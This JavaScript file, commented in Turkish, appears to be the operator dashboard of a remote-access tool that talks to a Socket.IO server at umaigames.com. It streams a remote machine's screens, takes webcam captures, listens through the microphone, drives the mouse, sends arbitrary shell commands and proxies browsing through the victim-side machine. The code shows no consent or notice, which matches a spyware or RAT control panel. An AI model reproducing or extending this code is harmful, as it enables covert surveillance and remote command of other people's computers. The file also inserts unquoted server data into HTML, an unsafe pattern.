var info = {
  // UZAK SUNUCU İÇİN (umaigames.com - Electron ile aynı):
  host: "umaigames.com", // Electron ile aynı host kullanılmalı
  port: 80,
  
  // YEREL TEST İÇİN:
  // host: "localhost",
  // port: 3011,
  
  dashboardId: new Date().getTime() + "-" + Math.floor(Math.random() * 99999),
};

// Şifre koruması kontrolü - Sadece şifre doğru girildiyse bağlan
var socket = null;

function initializeSocket() {
  // Eğer zaten bağlanmışsa tekrar bağlanma
  if (socket && socket.connected) {
    return;
  }
  
  // Electron ile aynı basit bağlantı ayarlarını kullan
  // ÖNEMLİ: Port'u açıkça belirtmek gerekiyor - aksi halde tarayıcı HTTPS'e yönlendirebilir
  // Mixed content (HTTP->HTTPS) sorununu önlemek için HTTP ve port açıkça belirtilmeli
  var socketUrl = "http://" + info.host + ":" + info.port;
  console.log("🔌 Socket bağlantısı deneniyor:", socketUrl);

  socket = io.connect(socketUrl, {
    // Port'u açıkça belirt - Mixed content sorununu önle
    forceNew: true,
    // Transport ayarları
    transports: ['polling', 'websocket'],
    // Reconnection ayarları
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionDelayMax: 5000,
    maxReconnectionAttempts: 5,
    // Timeout
    timeout: 20000
  });
  
  setupSocketEvents();
}

function setupSocketEvents() {
  if (!socket) return;
  
  var socketUrl = "http://" + info.host + ":" + info.port;

  // Bağlantı başarılı
  socket.on("connect", function() {
    console.log("=".repeat(50));
    console.log("✅ Web Socket bağlantısı başarılı");
    console.log("🔌 Socket ID:", socket.id);
    console.log("🌐 Sunucu:", socketUrl);
    console.log("📋 Dashboard ID:", info.dashboardId);
    console.log("=".repeat(50));
  });

  // Bağlantı hatalarını yakala
  socket.on("connect_error", function(error) {
    console.error("❌ Socket bağlantı hatası:", error.message);
    console.error("Sunucuya bağlanılamıyor:", socketUrl);
    console.error("Hata detayı:", error);
    
    if (error.message.includes("Bad request")) {
      console.error("💡 'Bad request' hatası genellikle Socket.IO versiyon uyumsuzluğu veya transport sorunudur.");
      console.error("💡 Sunucunun Socket.IO v4 kullandığından emin olun.");
    } else if (error.message.includes("timeout") || error.message.includes("xhr poll error")) {
      console.error("💡 Bağlantı zaman aşımı - Sunucu çalışmıyor olabilir veya port kapalı.");
      console.error("💡 Kontrol edin:");
      console.error("   1. Sunucu çalışıyor mu? (cd web/server && node server.js)");
      console.error("   2. Port açık mı?");
      console.error("   3. Firewall portu engelliyor mu?");
      if (info.host === "umaigames.com") {
        console.error("   4. umaigames.com sunucusunda port açık mı?");
        console.error("   5. Reverse proxy (Nginx/Apache) yapılandırması doğru mu?");
        console.error("   6. CORS ayarları doğru mu? (Sunucuda origin: '*' olmalı)");
        console.error("   7. Tarayıcı console'da CORS hatası var mı?");
      }
    } else if (error.message.includes("CORS")) {
      console.error("💡 CORS hatası - Sunucuda CORS ayarlarını kontrol edin.");
      console.error("💡 Sunucuda cors: { origin: '*' } olmalı.");
    }
    
    // Mixed content (HTTP->HTTPS) hatası kontrolü
    if (error.message.includes("Mixed Content") || 
        (error.message.includes("https://") && socketUrl.includes("http://"))) {
      console.error("💡 MIXED CONTENT HATASI TESPİT EDİLDİ!");
      console.error("💡 Tarayıcı HTTP'den HTTPS'e yönlendiriyor.");
      console.error("💡 Çözüm:");
      console.error("   1. umaigames.com sunucusunda HTTP->HTTPS yönlendirmesini kontrol edin");
      console.error("   2. HSTS (HTTP Strict Transport Security) header'ını kontrol edin");
      console.error("   3. Sunucu yapılandırmasında port için HTTP'ye izin verin");
      console.error("   4. Veya HTTPS üzerinden çalışacak şekilde sunucuyu yapılandırın");
    }
  });

  socket.on("connect_timeout", function() {
    console.error("⏱️ Socket bağlantı zaman aşımı");
  });
  
  // Socket event'leri - connect event
  socket.on("connect", function () {
    console.log(socket.id);
    socket.emit("joinToRoom", { roomName: "dashboard-" + info.dashboardId });
  });

  socket.on("disconnect", function () {
    console.log("Disconnected !");
  });

  socket.on("screenshotResponse", function (data) {
    !!data.src ? console.log('+') : console.log('-');

    if (data.src && data.src.length > 0) {
      $(".listOfScreensAndWindows").html(
        '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src=' +
        data.src +
        "></div>"
      );
      // Otomatik refresh - sadece eğer hala aynı screen seçiliyse
      const currentScreen = $("#screenSelect").val();
      if (currentScreen && currentScreen !== "") {
        setTimeout(() => {
          // Sadece hala aynı screen seçiliyse devam et
          if ($("#screenSelect").val() === currentScreen) {
            getScreenshot();
          }
        }, 1000); // 1 saniye sonra bir sonraki frame
      }
    } else {
      // Hata durumunda veya boş response
      console.error("Empty screenshot response");
      $(".listOfScreensAndWindows").html(
        '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><div class="text-center text-danger p-5">Failed to get screenshot</div></div>'
      );
    }
  });

  socket.on("camShotResponse", function (data) {
    $(".listOfScreensAndWindows").html(
      '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src=' +
      data.src +
      "></div>"
    );
  });

  socket.on("camBinary", function (data) {
    const blob = new Blob([data.data], { type: 'image/jpeg' });
    const url = URL.createObjectURL(blob);
    $(".listOfScreensAndWindows").html(
      '<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><img class="w-100 h-100 p-0 m-0" src="' + url + '"></div>'
    );
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });

  socket.on("audioStreamResponse", function (data) {
    console.log("🎵 Audio stream response received from server");
    
    if (data.audioData) {
      console.log("🎵 Audio chunk received:", data.audioData.length, "chars (base64)");
      
      try {
        const binaryString = atob(data.audioData);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
          bytes[i] = binaryString.charCodeAt(i);
        }
        
        let mimeType = 'audio/webm';
        if (data.mimeType) {
          mimeType = data.mimeType;
        }
        
        const blob = new Blob([bytes], { type: mimeType });
        const url = URL.createObjectURL(blob);
        
        if (currentAudioUrl) {
          URL.revokeObjectURL(currentAudioUrl);
        }
        
        currentAudioUrl = url;
        
        const audioElement = document.getElementById("audioStream");
        audioElement.src = url;
        audioElement.volume = 1.0;
        audioElement.muted = false;
        audioElement.preload = "auto";
        
        audioElement.play().then(() => {
          console.log("✅ Audio playing successfully");
        }).catch(e => {
          console.error("❌ Audio play error:", e);
        });
        
      } catch (error) {
        console.error("❌ Error processing audio data:", error);
      }
    }
  });

  socket.on("audioListenStatus", function (data) {
    const statusText = document.getElementById("audioStatusText");
    
    if (data.status === "started") {
      statusText.textContent = "Listening (high sensitivity)...";
      statusText.className = "text-success";
    } else if (data.status === "stopped") {
      statusText.textContent = "Stopped";
      statusText.className = "text-muted";
    } else if (data.status === "error") {
      statusText.textContent = "Error: " + data.error;
      statusText.className = "text-danger";
    }
  });

  socket.on("getRunResponse", function (data) {
    console.log({ getRunResponse: data });
    $(".cmdArea").text(data.cmd);
  });

  // Screen listesi response
  socket.on("getScreenListResponse", function (data) {
    const select = $("#screenSelect");
    const currentValue = select.val(); // Mevcut seçimi sakla
    
    select.empty();
    
    if (data.screens && data.screens.length > 0) {
      data.screens.forEach((screen, index) => {
        const isScreen = screen.id.startsWith("screen:") || screen.id.startsWith("Screen");
        const label = screen.name || (isScreen ? `Screen ${index + 1}` : screen.name);
        const type = isScreen ? 'screen' : 'window';
        select.append(`<option value="${index}" data-type="${type}" data-id="${screen.id}">${label}</option>`);
      });
      
      // Eğer mevcut seçim hala geçerliyse onu koru, değilse ilkini seç
      if (currentValue && select.find(`option[value="${currentValue}"]`).length > 0) {
        select.val(currentValue);
      } else if (data.screens.length > 0) {
        select.val("0");
      }
      
      // Seçim değiştiyse screenshot al
      if (select.val() !== "") {
        // Önceki ekranı temizle
        $(".listOfScreensAndWindows").html('<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><div class="text-center text-muted p-5">Loading...</div></div>');
        // Yeni screenshot isteği gönder
        setTimeout(() => {
          getScreenshot();
        }, 100);
      }
    } else {
      select.append('<option value="">No screens/windows found</option>');
    }
  });
}

// Audio URL için global değişken
let currentAudioUrl = null;

function getScreenshot() {
  if (!socket || !socket.connected) {
    console.error("Socket not connected, cannot get screenshot");
    return;
  }
  
  const screenSelect = $("#screenSelect").val();
  if (!screenSelect || screenSelect === "") {
    console.error("No screen selected");
    return;
  }
  
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    screen: screenSelect, // Screen select'ten al
    dimension: $(".screen").val(), // Max width: 1280, max height: 720
  };
  
  console.log("Requesting screenshot for screen index:", screenSelect);
  socket.emit("screenshotRequest", data);
}

function getCamShot(one = false) {
  if (!socket || !socket.connected) return;
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    screen: $(".select").val(),
    dimension: $(".screen").val(), // Max width: 1280, max height: 720
    one,
  };
  socket.emit("camShotRequest", data);
}

function startAudioListen() {
  if (!socket || !socket.connected) return;
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    action: "start"
  };
  socket.emit("audioListenRequest", data);
}

function stopAudioListen() {
  if (!socket || !socket.connected) return;
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    action: "stop"
  };
  socket.emit("audioListenRequest", data);
  
  // Audio URL'yi temizle
  if (currentAudioUrl) {
    URL.revokeObjectURL(currentAudioUrl);
    currentAudioUrl = null;
  }
  
  // Audio element'i temizle
  const audioElement = document.getElementById("audioStream");
  audioElement.src = "";
  
  console.log("🔇 Audio stream stopped and cleaned up (2s intervals)");
}

$(document).ready(function () {
  if (localStorage.getItem("terminalId")) {
    $(".terminalId").val(localStorage.getItem("terminalId"));
  }
  
  // Socket bağlandıktan sonra screen listesini yükle
  if (socket && socket.connected) {
    setTimeout(() => {
      loadScreenList();
    }, 1000);
  } else {
    // Socket henüz bağlanmadıysa, bağlandığında yükle
    (function waitForSocket() {
      if (socket && socket.connected) {
        setTimeout(() => {
          loadScreenList();
        }, 1000);
      } else {
        setTimeout(waitForSocket, 500);
      }
    })();
  }
});

$(document).on("change", ".terminalId", function () {
  localStorage.setItem("terminalId", $(this).val());
  // Terminal değiştiğinde screen listesini yenile
  loadScreenList();
});

// Dinamik screen/window listesi
function loadScreenList() {
  if (!socket || !socket.connected) {
    console.error("Socket not connected, cannot load screen list");
    return;
  }
  
  const terminalId = $(".terminalId").val();
  if (!terminalId) {
    console.error("Terminal ID is empty");
    return;
  }
  
  const data = {
    from: "terminal-" + terminalId,
    to: "dashboard-" + info.dashboardId,
  };
  
  console.log("Loading screen list for terminal:", terminalId);
  socket.emit("getScreenListRequest", data);
}

// Screen selectbox'a tıklayınca veya focus olunca listeyi yükle
$(document).on("click focus", "#screenSelect", function () {
  const select = $(this);
  // Eğer sadece placeholder varsa veya hiç seçenek yoksa yükle
  if (select.find("option").length <= 1 || select.find("option[value='']").length > 0 && select.find("option").length === 1) {
    select.html('<option value="">Loading screens...</option>');
    loadScreenList();
  }
});

// Screen değiştiğinde önceki ekranı temizle ve yeni screenshot al
$(document).on("change", "#screenSelect", function () {
  const selectedValue = $(this).val();
  if (!selectedValue || selectedValue === "") {
    // Seçim kaldırıldıysa ekranı temizle
    $(".listOfScreensAndWindows").html('<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><div class="text-center text-muted p-5">No screen selected</div></div>');
    return;
  }
  
  // Önceki ekranı temizle
  $(".listOfScreensAndWindows").html('<div class="col-12 col-sm-12 col-md-12 m-0 p-0"><div class="text-center text-muted p-5">Loading screen...</div></div>');
  
  // Yeni screenshot isteği gönder
  setTimeout(() => {
    getScreenshot();
  }, 100);
});

$(document).on("click", ".screenshotBtn", function () {
  getScreenshot();
});

$(document).on("click", ".camShotBtn", function () {
  getCamShot();
});

$(document).on("click", ".oneCamShotBtn", function () {
  getCamShot(true);
});

$(document).on("click", ".startListenBtn", function () {
  console.log("Start Listen button clicked");
  startAudioListen();
});

$(document).on("click", ".stopListenBtn", function () {
  console.log("🛑 Stop Listen button clicked");
  stopAudioListen();
});

$(document).on("click", ".listOfScreensAndWindows", function () {
  if (!socket || !socket.connected) return;
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
  };
  socket.emit("click", data);
});
$(document).on("mousemove", ".listOfScreensAndWindows", function (e) {
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    screen: $(".select").val(),
    webScreen: {
      width: $(".listOfScreensAndWindows").width(),
      height: $(".listOfScreensAndWindows").height(),
    },
    mousePosition: {
      x: e.pageX - $(".listOfScreensAndWindows").offset().left,
      y: e.pageY - $(".listOfScreensAndWindows").offset().top,
    },
  };
  if (socket) {
    socket.emit("mousemove", data);
  }
});

function getRun() {
  if (!socket || !socket.connected) return;
  var data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    cmd: $(".cmd").val(),
  };
  socket.emit("getRunRequest", data);
}

$(document).on("click", ".runBtn", function () {
  getRun();
});

/**
 * Remote Browser
 * Dashboard'taki mini tarayıcı paneli üzerinden, seçili Application ID'ye
 * bir URL gönderilir. Asıl tarayıcı terminal makinede açılır, tüm trafik
 * o makineden çıkar; burada sadece ekran görüntüsü gösterilir.
 */

function openRemoteBrowser() {
  if (!socket || !socket.connected) return;

  const url = $(".remoteBrowserUrl").val();
  if (!url) {
    console.error("Remote browser URL is empty");
    return;
  }

  const data = {
    from: "terminal-" + $(".terminalId").val(),
    to: "dashboard-" + info.dashboardId,
    url,
  };

  socket.emit("remoteBrowserOpen", data);
}

// Remote Browser - HTML iframe gösterimi
let currentRemoteBrowserUrl = null;

// Remote browser HTML'ini al ve iframe'de göster
if (typeof io !== "undefined") {
  (function waitForSocket() {
    if (!socket) {
      setTimeout(waitForSocket, 500);
      return;
    }
    socket.on("remoteBrowserHTML", function (data) {
      if (!data.html) return;

      const iframe = document.getElementById("remoteBrowserFrame");
      const placeholder = document.getElementById("remoteBrowserPlaceholder");
      
      if (iframe) {
        // HTML'i blob URL olarak iframe'e yükle
        const blob = new Blob([data.html], { type: 'text/html' });
        const blobUrl = URL.createObjectURL(blob);
        iframe.src = blobUrl;
        currentRemoteBrowserUrl = data.url;
        
        if (placeholder) placeholder.style.display = "none";
        
        // Eski blob URL'yi temizle (memory leak önleme)
        if (iframe._previousBlobUrl) {
          URL.revokeObjectURL(iframe._previousBlobUrl);
        }
        iframe._previousBlobUrl = blobUrl;
      }
    });
  })();
}

// Iframe içinden gelen mesajları dinle (link/form tıklamaları)
window.addEventListener("message", function(event) {
  if (event.data && event.data.type === "remoteBrowserNavigate") {
    // Yeni URL'ye git
    const url = event.data.url;
    if (url && socket && socket.connected) {
      const data = {
        from: "terminal-" + $(".terminalId").val(),
        to: "dashboard-" + info.dashboardId,
        url: url
      };
      socket.emit("remoteBrowserOpen", data);
    }
  } else if (event.data && event.data.type === "remoteBrowserSubmit") {
    // Form submit - POST isteği gönder
    const url = event.data.url;
    const formData = event.data.formData;
    
    if (url && socket && socket.connected) {
      // Form data'yı serialize et
      const formDataObj = {};
      if (formData && formData.entries) {
        for (let pair of formData.entries()) {
          formDataObj[pair[0]] = pair[1];
        }
      }
      
      const data = {
        from: "terminal-" + $(".terminalId").val(),
        to: "dashboard-" + info.dashboardId,
        url: url,
        method: "POST",
        formData: formDataObj
      };
      socket.emit("remoteBrowserOpen", data);
    }
  }
});

// Remote browser Open butonu
$(document).on("click", ".remoteBrowserOpenBtn", function () {
  openRemoteBrowser();
});

// Test audio function
function testAudio() {
  console.log("🧪 Testing audio element...");
  const audioElement = document.getElementById("audioStream");
  
  // Audio element durumunu kontrol et
  console.log("Audio element:", audioElement);
  console.log("Audio src:", audioElement.src);
  console.log("Audio volume:", audioElement.volume);
  console.log("Audio muted:", audioElement.muted);
  console.log("Audio readyState:", audioElement.readyState);
  console.log("Audio networkState:", audioElement.networkState);
  
  // Test sesi çal - basit beep sesi
  const audioContext = new (window.AudioContext || window.webkitAudioContext)();
  const oscillator = audioContext.createOscillator();
  const gainNode = audioContext.createGain();
  
  oscillator.connect(gainNode);
  gainNode.connect(audioContext.destination);
  
  oscillator.frequency.setValueAtTime(440, audioContext.currentTime); // A note
  gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
  
  oscillator.start(audioContext.currentTime);
  oscillator.stop(audioContext.currentTime + 0.5);
  
  console.log("🔊 Test beep sound played");
  
  // Socket bağlantısını test et
  console.log("🔌 Socket connected:", socket.connected);
  console.log("🔌 Socket id:", socket.id);
}
